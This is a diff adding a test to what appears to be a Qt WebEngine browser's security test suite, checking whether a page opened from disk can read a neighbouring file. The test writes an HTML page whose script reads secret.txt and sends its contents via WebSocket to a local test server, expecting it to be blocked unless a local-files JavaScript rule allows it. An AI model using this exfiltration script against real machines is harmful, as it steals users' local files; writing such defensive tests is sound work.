@@ -6,6 +6,11 @@
 //
 // **The allowed case is the control.** Without it, a page that gathered nothing
 // for any other reason would read as the block working.
+//
+// And the other thing a page can read of the machine: a document opened from disk
+// can read any other file unless it runs no script, and a WebSocket carries what
+// it read past Qt's block on local pages reaching the network. Its title is what
+// says the page loaded at all, since that needs no script.
 #include "main_window.h"
 #include "policy_engine.h"
 #include "request_filter.h"
@@ -21,6 +26,7 @@
 #include <QTcpSocket>
 #include <QTimer>
 #include <QTreeView>
+#include <QWebEngineView>
 #include <QUrlQuery>
 #include <cstdio>
 
@@ -161,6 +167,48 @@ int main(int argc, char *argv[]) {
 	check(!allowed.isEmpty(),
 	      QString("the addresses appear, so the page above could have read them "
 	              "(%1 of them)").arg(allowed.size()));
+
+	std::printf("\n== a document opened from this disk ==\n");
+	const QString dir = out + "/local";
+	QDir().mkpath(dir);
+	const auto write = [](const QString &path, const QByteArray &text) {
+		QFile f(path);
+		return f.open(QIODevice::WriteOnly | QIODevice::Truncate) &&
+		       f.write(text) == text.size();
+	};
+	const QByteArray port = QByteArray::number(server.serverPort());
+	check(write(dir + "/secret.txt", "the other file\n") &&
+	      write(dir + "/page.html",
+	            "<!doctype html><title>a saved page</title><script>"
+	            "var q = new XMLHttpRequest();"
+	            "q.onload = function () { new WebSocket('ws://127.0.0.1:" + port +
+	            "/report?what=stolen&value=' + encodeURIComponent(q.responseText)); };"
+	            "q.open('GET', 'secret.txt'); q.send();</script>"),
+	      "the page and the file beside it are written");
+	const auto open_local = [&] {
+		server.reported.clear();
+		bar->setText(QUrl::fromLocalFile(dir + "/page.html").toString() +
+		             "?v=" + QString::number(++visit));
+		QMetaObject::invokeMethod(bar, "returnPressed");
+		for (int i = 0; i < 40 && !server.reported.contains("stolen"); ++i)
+			spin(100);
+	};
+	const auto shown_title = [&] {
+		for (QWebEngineView *v : w.findChildren<QWebEngineView *>())
+			if (v->isVisible())
+				return v->title();
+		return QString();
+	};
+	open_local();
+	check(shown_title() == "a saved page", QString("the page loaded (%1)").arg(shown_title()));
+	check(!server.reported.contains("stolen"),
+	      QString("and read nothing (%1)").arg(server.reported.value("stolen")));
+
+	policy.set_setting("local-files", policy::feature::javascript, policy::setting::allow);
+	open_local();
+	check(server.reported.value("stolen").startsWith("the other file"),
+	      QString("a rule for local files lets it, so that was the rule at work (%1)")
+	        .arg(server.reported.value("stolen")));
 
 	std::printf("\n%d passed, %d failed\n", g_pass, g_fail);
 	return g_fail ? 1 : 0;
